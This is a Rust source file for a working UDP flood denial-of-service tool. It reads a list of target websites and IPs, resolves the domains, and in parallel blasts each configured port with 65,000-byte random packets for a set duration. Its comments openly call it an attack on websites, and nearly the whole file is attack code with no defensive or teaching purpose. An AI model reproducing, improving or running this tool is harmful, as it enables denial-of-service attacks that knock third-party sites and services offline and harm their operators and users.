#[macro_use]
extern crate log;

extern crate pretty_env_logger;

use std::{
    fmt::{Debug, Display, Formatter},
    fs::File,
    io::{BufRead, BufReader},
    net::{SocketAddr, UdpSocket},
    sync::{Arc, Mutex},
    thread::sleep,
    time::{Duration, Instant},
};

use anyhow::*;
use dns_lookup::lookup_host;
use portpicker::pick_unused_port;
use rand::{thread_rng, RngCore};
use rayon::prelude::*;

// ----- Attack Config START -----
#[derive(Clone)]
struct Config {
    execution_time: u64,
    timeout: Duration,
    packet_size: usize,
    default_ports: Vec<String>,
    unreachable_stop_trying: bool,
}

impl Display for Config {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "Config {{ execution_time: {}s, timeout: {}ms, packet_size: {} bytes, default_ports: [{}] }}",
            self.execution_time,
            self.timeout.as_millis(),
            self.packet_size,
            self.default_ports.join(", ")
        )
    }
}

fn load_config() -> Result<Config> {
    let config_file = File::open("config")?;
    let config_lines = BufReader::new(config_file).lines();

    // Default execution time - a minute
    let mut execution_time = 60;

    // Default timeout - 10ms
    let mut timeout = 10;

    // Default packet size - 65000 bytes
    let mut packet_size = 65000;

    let mut default_ports = vec![];

    // Default for stop trying to attack unreachable anymore websites - true
    let mut unreachable_stop_trying = true;

    for config_line in config_lines.flatten() {
        if config_line.is_empty() {
            continue;
        }

        let mut split = config_line.split(' ');

        if let Some(first) = split.next() {
            match first {
                "execution_time" => {
                    if let Some(ex_time) = split.next() {
                        execution_time = ex_time.parse()?;
                    }
                }
                "timeout" => {
                    if let Some(t_out) = split.next() {
                        timeout = t_out.parse()?;
                    }
                }
                "packet_size" => {
                    if let Some(p_size) = split.next() {
                        packet_size = p_size.parse()?;
                    }
                }
                "default_ports" => {
                    while let Some(port) = split.next() {
                        default_ports.push(port.to_string());
                    }
                }
                "unreachable_stop_trying" => {
                    if let Some(u_s_t) = split.next() {
                        unreachable_stop_trying = match u_s_t.to_lowercase().as_str() {
                            "true" => true,
                            "false" => false,
                            _ => true,
                        }
                    }
                }
                _ => {}
            }
        }
    }

    // Default port if not set - 80
    if default_ports.len() == 0 {
        default_ports.push("80".to_string());
    }

    let config = Config {
        execution_time,
        timeout: Duration::from_millis(timeout),
        packet_size,
        default_ports,
        unreachable_stop_trying,
    };

    info!("Loaded config: {}", config);

    Ok(config)
}
// ----- Attack Config END -----

// ----- Website Configuration START -----
#[derive(Clone)]
struct WebsiteConfig {
    pub address: String,
    pub ports: Vec<String>,
    pub is_domain: bool,
}

impl Debug for WebsiteConfig {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        let spacing = if self.is_domain { " " } else { "" };

        write!(
            f,
            "[{}]",
            self.ports
                .iter()
                .map(|port| format!("{}{}:{}{}", self.address, spacing, spacing, port))
                .collect::<Vec<_>>()
                .join(", ")
        )
    }
}

fn load_websites_configs(config: &Config) -> Result<Vec<WebsiteConfig>> {
    info!("Loading websites configs...");

    let configs = Arc::new(Mutex::new(vec![]));
    let websites_file = File::open("websites")?;
    let websites = BufReader::new(websites_file).lines();

    websites
        .flatten()
        .collect::<Vec<_>>()
        .par_iter()
        .for_each(|website| {
            if website.is_empty() {
                return;
            }

            let mut split = website.split(' ');

            if let Some(first) = split.next() {
                let is_domain = match first {
                    "ip" => false,
                    "domain" => true,
                    _ => false,
                };

                if let Some(address) = split.next() {
                    let mut ports = vec![];

                    while let Some(port) = split.next() {
                        ports.push(port.to_string());
                    }

                    if ports.len() == 0 {
                        ports = config.default_ports.clone();
                    }

                    for port in ports.iter() {
                        info!(
                            "Found {} {} with port {}",
                            if is_domain { "domain" } else { "ip" },
                            address,
                            port
                        );
                    }

                    (*configs).lock().unwrap().push(WebsiteConfig {
                        address: address.to_string(),
                        ports,
                        is_domain,
                    })
                }
            }
        });

    info!("All websites loaded!\n{:?}", configs);

    let res = Ok(configs.lock().unwrap().clone());
    res
}
// ----- Website Configuration END -----

// ----- Attack Websites START -----
fn attack_websites(config: Config, website_configs: Vec<WebsiteConfig>) -> Result<()> {
    info!("Starting attack on the websites...");

    let start = Instant::now();

    let socket_addresses = Arc::new(Mutex::new(vec![]));

    website_configs.par_iter().for_each(|website_config| {
        if !website_config.is_domain {
            website_config.ports.par_iter().for_each(|port| {
                (*socket_addresses).lock().unwrap().push(format!(
                    "{}:{}",
                    website_config.address,
                    port.clone()
                ));
            });
        } else {
            if let std::result::Result::Ok(ips) = lookup_host(&website_config.address) {
                ips.par_iter().for_each(|ip| {
                    website_config.ports.par_iter().for_each(|port| {
                        (*socket_addresses)
                            .lock()
                            .unwrap()
                            .push(format!("{}:{}", ip, port));
                    });
                });
            } else {
                error!(
                    "Couldn't find ips for the domain {}",
                    website_config.address
                );
            }
        }
    });

    (*socket_addresses)
        .lock()
        .unwrap()
        .par_iter()
        .for_each(|socket_address| {
            let sender: SocketAddr = format!(
                "0.0.0.0:{}",
                pick_unused_port().expect("No free port found!")
            )
            .parse()
            .expect("Couldn't get sender IP address");

            info!("Creating socket for {} ...", sender);

            let socket =
                UdpSocket::bind(sender).expect(&format!("Couldn't bind socket to {}", sender));

            while start.elapsed().as_secs() < config.execution_time {
                match socket.connect(socket_address.clone()) {
                    std::result::Result::Ok(_) => {
                        let buffer = generate_buffer(config.packet_size);

                        while start.elapsed().as_secs() < config.execution_time {
                            let res = socket.send(buffer.as_slice());

                            match res {
                                std::result::Result::Ok(size) => {
                                    info!(
                                        "Successfully sent a packet of size {} to {}",
                                        size, socket_address
                                    );
                                }
                                std::result::Result::Err(error) => {
                                    error!(
                                        "Failed to send a packet to {} .\nError message: {}",
                                        socket_address, error
                                    );

                                    if config.unreachable_stop_trying {
                                        break;
                                    }
                                }
                            }

                            sleep(config.timeout);
                        }
                    }
                    std::result::Result::Err(error) => {
                        error!(
                            "Couldn't connect to {}.\nError message: {}",
                            socket_address, error
                        );

                        break;
                    }
                }
            }
        });

    Ok(())
}

fn generate_buffer(size: usize) -> Vec<u8> {
    let mut buffer = Vec::with_capacity(size);
    unsafe {
        buffer.set_len(size);
    }

    thread_rng().fill_bytes(buffer.as_mut_slice());

    buffer
}
// ----- Attack Websites END -----
fn main() -> Result<()> {
    std::env::set_var("RUST_LOG", "info");

    pretty_env_logger::init_timed();

    let config = load_config()?;
    let website_configs = load_websites_configs(&config)?;

    attack_websites(config, website_configs)?;

    Ok(())
}
